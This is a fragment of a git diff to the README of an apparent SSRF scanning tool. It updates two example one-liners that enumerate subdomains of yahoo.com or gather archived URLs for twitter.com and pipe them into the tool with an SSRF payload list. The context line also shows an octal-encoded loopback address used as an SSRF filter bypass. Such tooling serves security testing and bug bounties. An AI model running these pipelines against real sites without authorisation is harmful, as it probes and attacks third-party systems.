@@ -216,8 +216,8 @@ http://0177.00.00.01
 ### Best SSRF Tips using this tool :
 
 ```sh
-$ amass enum -passive -brute -d yahoo.com -silent | httpx -silent | tee domains.txt | ssrf-tool -domains domains.txt -payloads ssrf.txt -silent=false -paths=true -patterns patterns.txt
-$ echo "twitter.com" | waybackurls | tee domains.txt; ssrftool -domains domains.txt -silent=false -paths=false -payloads ssrf.txt
+$ amass enum -passive -brute -d yahoo.com -silent | httpx -silent | tee domains.txt | ssrf-tool -domains domains.txt -payloads payloads.txt -silent=false -paths=true -patterns patterns.txt
+$ echo "twitter.com" | gauplus -random-agent -t 100 | tee domains.txt; ssrftool -domains domains.txt -silent=false -paths=false -payloads payloads.txt
 ```
 
 
